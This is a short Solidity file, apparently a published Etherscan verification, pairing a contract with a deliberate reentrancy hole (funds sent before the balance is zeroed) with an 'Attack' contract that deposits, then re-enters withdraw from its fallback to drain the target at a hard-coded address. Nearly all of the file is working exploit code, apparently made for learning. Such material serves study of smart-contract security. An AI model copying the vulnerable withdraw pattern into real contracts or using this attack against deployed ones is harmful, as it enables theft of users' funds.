/**
 *Submitted for verification at Etherscan.io on 2021-12-04
*/

pragma solidity ^0.6.0;

//target
contract Vuln {
    mapping(address => uint256) public balances;    

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }    

    function withdraw() public {
        msg.sender.call.value(balances[msg.sender])('');
        balances[msg.sender] = 0;
    }
}

//a problem for the target
contract Attack {
    uint8 count = 0;    

    // get the target contract object    
    Vuln target = Vuln(0x36A540E3A78084962B75E25877CfACf8846Be018);    

    function deposit() public payable {
        target.deposit.value(msg.value)(); // deposit ETH
        target.withdraw();                // withdraw ETH
    }   

    function give_back() public payable {
        require(msg.sender.send(address(this).balance));
    }    

    fallback() external payable {
        count++;                                   // iterate
        if(count <= 5) target.withdraw();   // withdraw(), withdraw(), ...
    }    

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }    

    receive() external payable {
        //does nothing, but supresses my warnings
    }
}